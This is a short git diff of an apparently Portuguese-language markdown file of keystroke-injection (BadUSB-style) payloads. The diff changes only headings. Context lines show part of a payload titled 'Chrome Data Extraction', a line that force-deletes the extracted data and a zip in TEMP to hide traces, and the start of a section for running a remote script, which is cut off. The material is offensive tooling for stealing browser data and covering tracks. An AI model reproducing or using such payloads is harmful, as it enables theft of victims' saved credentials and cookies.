@@ -1,4 +1,6 @@
-# Opção 01
+# Windows
+## Opção 01 - Localmente 
+
 ```bash
 ## ============================================
 ##     PAYLOAD: Chrome Data Extraction
@@ -55,7 +57,8 @@ Delay 1000
 WinPrintLine Remove-Item -Recurse -Force $w, $dst, "$env:TEMP\data.zip" -EA 0
 WinPrintLine exit
 ```
-# Rodar Script Remoto
+## Rodar Script Remoto
+
 ```bash
 Delay 1000
 GuiR
